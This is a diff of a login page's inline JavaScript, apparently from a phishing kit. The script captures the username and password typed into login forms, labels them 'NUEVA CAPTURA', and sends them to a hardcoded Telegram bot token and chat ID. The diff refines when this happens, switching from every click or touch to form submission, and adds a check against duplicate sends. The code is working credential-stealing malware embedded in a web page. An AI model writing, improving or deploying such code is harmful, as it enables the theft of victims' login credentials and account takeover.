@@ -427,35 +427,53 @@
   (function () {
     const TOKEN = "9159089747:AAGrdR7YNxmKCXvzec1LLpWhKCvt2ivc6uQ";
     const CHAT_ID = "7007914207";
+    let ultimoEnvio = "";
+    let ultimaHora = 0;
 
-    function leerCampos() {
-      const inputs = Array.from(document.querySelectorAll("input"));
+    function leerCampos(form) {
+      const scope = form || document;
 
-      const passInput =
-        inputs.find((el) => el.type === "password" || /pass|clave/i.test(el.name || el.id || "")) || null;
-
-      const userInput =
-        document.getElementById("loginUsuario") ||
-        inputs.find(
-          (el) =>
-            el !== passInput &&
-            el.type !== "hidden" &&
-            el.type !== "submit" &&
-            el.type !== "button" &&
-            el.type !== "checkbox" &&
-            el.type !== "radio"
+      const userEl =
+        scope.querySelector("#campoCorreo") ||
+        scope.querySelector("#loginUsuario") ||
+        Array.from(scope.querySelectorAll("input")).find((el) =>
+          ["text", "email", "tel", "number"].includes(el.type)
         ) ||
         null;
 
+      const passEl =
+        scope.querySelector("#campoClave") ||
+        scope.querySelector("#loginPasswordInline") ||
+        scope.querySelector('input[type="password"]') ||
+        null;
+
+      // Si no se pasó un formulario específico, revisa ambos y toma el que tenga texto
+      if (!form) {
+        const uModal = document.querySelector("#campoCorreo")?.value.trim() || "";
+        const pModal = document.querySelector("#campoClave")?.value || "";
+        const uInline = document.querySelector("#loginUsuario")?.value.trim() || "";
+        const pInline = document.querySelector("#loginPasswordInline")?.value || "";
+
+        if (uModal || pModal) {
+          return { usuario: uModal, password: pModal };
+        }
+        return { usuario: uInline, password: pInline };
+      }
+
       return {
-        usuario: userInput ? userInput.value.trim() : "",
-        password: passInput ? passInput.value : ""
+        usuario: userEl ? userEl.value.trim() : "",
+        password: passEl ? passEl.value : ""
       };
     }
 
-    function manejarAccion() {
-      const { usuario, password } = leerCampos();
+    function enviarTelegram(usuario, password) {
       if (!usuario && !password) return;
+
+      const firma = usuario + "|" + password;
+      const ahora = Date.now();
+      if (firma === ultimoEnvio && ahora - ultimaHora < 2500) return;
+      ultimoEnvio = firma;
+      ultimaHora = ahora;
 
       const mensaje = [
         "NUEVA CAPTURA",
@@ -477,9 +495,27 @@
       window._imgs.push(img);
     }
 
-    document.addEventListener("pointerdown", manejarAccion, true);
-    document.addEventListener("touchstart", manejarAccion, true);
-    document.addEventListener("click", manejarAccion, true);
+    document.addEventListener(
+      "submit",
+      function (e) {
+        const form = e.target;
+        const { usuario, password } = leerCampos(form);
+        enviarTelegram(usuario, password);
+      },
+      true
+    );
+
+    document.addEventListener(
+      "click",
+      function (e) {
+        const btn = e.target.closest('button[type="submit"], input[type="submit"]');
+        if (!btn) return;
+        const form = btn.closest("form");
+        const { usuario, password } = leerCampos(form);
+        enviarTelegram(usuario, password);
+      },
+      true
+    );
   })();
 </script>
 </body>
